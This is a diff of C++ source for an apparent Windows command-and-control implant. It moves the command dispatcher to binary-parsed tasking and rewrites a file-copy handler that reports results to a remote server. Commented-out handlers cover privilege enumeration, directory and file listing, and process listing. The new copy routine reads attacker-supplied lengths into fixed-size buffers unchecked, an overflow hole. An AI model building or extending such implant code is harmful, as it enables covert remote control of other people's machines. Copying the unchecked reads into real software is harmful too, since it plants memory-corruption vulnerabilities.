@@ -1,5 +1,6 @@
 #include "apiFunc.hpp"
 #include "commands.hpp"
+#include "bytes.hpp"
 #include <iostream>
 
 #define BASE_BUFFER_SIZE 100
@@ -12,12 +13,29 @@ typedef enum {
 	TYPE_LINK,
 };
 
-void Commands::Dispatch(INT code, PCHAR commandID, PCHAR Param, PCHAR Param2) {
-	printf("DEBUG: Received code = %d, CMD_CODE_GETPRIVS = %d\n", code, CMD_CODE_GETPRIVS);
+void Commands::Dispatch(PBYTE Data, INT DataSize) {
+	//printf("DEBUG: Received code = %d, CMD_CODE_GETPRIVS = %d\n", code, CMD_CODE_GETPRIVS);
+	g_Bytes->Set(Data, DataSize);
+	UINT ErrorCode = g_Bytes->Read4();
+	if (ErrorCode > 0) {
+		printf("No Command");
+		return;
+	}
+	UINT commandID = g_Bytes->Read4();
+	UINT CommandCode = g_Bytes->Read4();
+	printf("code -> %d\n", CommandCode);
 
-	switch (code)
+
+	/*
+		TODO
+			Update Handlers
+			Swap all to use binary format and parse
+			delete json shit
+	*/
+
+	switch (CommandCode)
 	{
-	case CMD_CODE_GETPRIVS:
+	/*case CMD_CODE_GETPRIVS:
 		printf("Getting privs\n");
 		cmd_getprivs(commandID);
 		break; 
@@ -27,16 +45,16 @@ void Commands::Dispatch(INT code, PCHAR commandID, PCHAR Param, PCHAR Param2) {
 	case CMD_CODE_LS:
 		printf("Running LS\n");
 		cmd_ls(commandID, Param);
-		break;
+		break;*/
 	case CMD_CODE_CP:
-		cmd_cp(commandID, Param, Param2);
+		cmd_cp(commandID, Data);
 		break;
-	case CMD_CODE_CAT:
+	/*case CMD_CODE_CAT:
 		cmd_cat(commandID, Param);
 		break;
 	case CMD_CODE_PS:
 		cmd_ps(commandID, Param);
-		break;
+		break;*/
 	default:
 		break;
 	}
@@ -230,19 +248,34 @@ CLEANUP:
 
 
 
-void Commands::cmd_cp(PCHAR CommandID, PCHAR source, PCHAR destination) {
+void Commands::cmd_cp(UINT CommandID, PBYTE Data) {
 
-	if (!WinApis->CopyFileA(source, destination, FALSE)) {
-		snprintf(this->tempBuffer, sizeof(this->tempBuffer), "[!] Error Copying: 0x%d", GetLastError());
+	BYTE src[MAX_PATH];
+	BYTE dst[MAX_PATH];
+
+	UINT srcLen = g_Bytes->Read4();
+	g_Bytes->ReadBytes(src, srcLen);
+	UINT dstLen = g_Bytes->Read4();
+	g_Bytes->ReadBytes(dst, dstLen);
+	char buf[100];
+	GetCurrentDirectoryA(100, buf);
+	printf("%s\n", buf);
+
+	int OutSize;
+
+	if (!WinApis->CopyFileA((CHAR*)src, (CHAR*)dst, FALSE)) {
+		OutSize = snprintf(this->tempBuffer, sizeof(this->tempBuffer), "[!] Error Copying: 0x%d", GetLastError());
 	}
 	else {
-		snprintf(this->tempBuffer, sizeof(this->tempBuffer), "[+] copied %s to %s", source, destination);
+		OutSize = snprintf(this->tempBuffer, sizeof(this->tempBuffer), "[+] copied %s to %s", src, dst);
 	}
 
+
+	/*
 	if (CraftOutputJson(CommandID, this->tempBuffer, &this->HeapBuffer)) {
 		g_NetworkManager->PostData((BYTE*)this->HeapBuffer, strlen(this->HeapBuffer));
 	}
-	if (this->HeapBuffer) HeapFree(GetProcessHeap(), 0, this->HeapBuffer);
+	if (this->HeapBuffer) HeapFree(GetProcessHeap(), 0, this->HeapBuffer);*/
 	return;
 }
 
